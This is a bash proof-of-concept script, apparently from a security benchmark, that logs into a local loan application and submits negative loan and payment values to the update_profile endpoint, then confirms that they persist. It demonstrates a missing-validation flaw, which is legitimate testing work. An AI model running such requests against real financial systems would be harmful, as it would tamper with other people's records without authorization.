#!/bin/bash
# POC: Demonstrates business logic flaw where negative financial values are accepted and persisted in the update_profile endpoint
# Target: ./repo
# Created: 2025-10-31T14:42:10.403Z
# Session: benchmark-XBEN-022-24-mhey9d7a

TARGET="http://localhost:8080"
COOKIE_FILE=$(mktemp)

echo "[*] Business Logic Flaw - Negative Financial Values POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Login to get session cookie
echo "[+] Step 1: Logging in as test user..."
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET/login" \
  -d "username=test&password=test" \
  -c "$COOKIE_FILE" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
echo "    Login HTTP Code: $HTTP_CODE"

if [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "302" ]; then
  echo "[!] Login failed with HTTP code: $HTTP_CODE"
  rm -f "$COOKIE_FILE"
  exit 1
fi

echo "[✓] Login successful"
echo ""

# Step 2: Update profile with negative financial values
echo "[+] Step 2: Setting negative financial values..."
echo "    loan_amount: -50000"
echo "    monthly_payment: -1000"
echo "    loan_term_months: 60"

UPDATE_RESPONSE=$(curl -s -X POST "$TARGET/update_profile" \
  -b "$COOKIE_FILE" \
  -d "name=John&lastname=Doe&email=john@example.com&loan_amount=-50000&loan_term_months=60&monthly_payment=-1000" \
  -w "\nHTTP_CODE:%{http_code}")

HTTP_CODE=$(echo "$UPDATE_RESPONSE" | grep "HTTP_CODE" | cut -d':' -f2)
echo "    Update HTTP Code: $HTTP_CODE"

if [ "$HTTP_CODE" != "200" ] && [ "$HTTP_CODE" != "302" ]; then
  echo "[!] Update failed with HTTP code: $HTTP_CODE"
  rm -f "$COOKIE_FILE"
  exit 1
fi

echo "[✓] Profile update accepted"
echo ""

# Step 3: Verify negative values persist
echo "[+] Step 3: Verifying negative values persisted..."
DETAILS_RESPONSE=$(curl -s "$TARGET/loan_details" -b "$COOKIE_FILE")

# Check for negative values in response
if echo "$DETAILS_RESPONSE" | grep -q "\-50000"; then
  echo "[✓] VULNERABILITY CONFIRMED: Negative loan amount (-50000) found in loan details!"
  LOAN_AMOUNT=$(echo "$DETAILS_RESPONSE" | grep -oP 'loan principal is \K[-0-9.]+' | head -1)
  echo "    Loan Amount: $LOAN_AMOUNT"
fi

if echo "$DETAILS_RESPONSE" | grep -q "\-1000"; then
  echo "[✓] VULNERABILITY CONFIRMED: Negative monthly payment (-1000) found in loan details!"
  MONTHLY_PAYMENT=$(echo "$DETAILS_RESPONSE" | grep -oP 'monthly payment is \K[-0-9.]+' | head -1)
  echo "    Monthly Payment: $MONTHLY_PAYMENT"
fi

echo ""
echo "[*] POC Complete - Business logic flaw confirmed!"
echo "[*] The application accepts and persists negative financial values without validation."
echo ""

# Cleanup
rm -f "$COOKIE_FILE"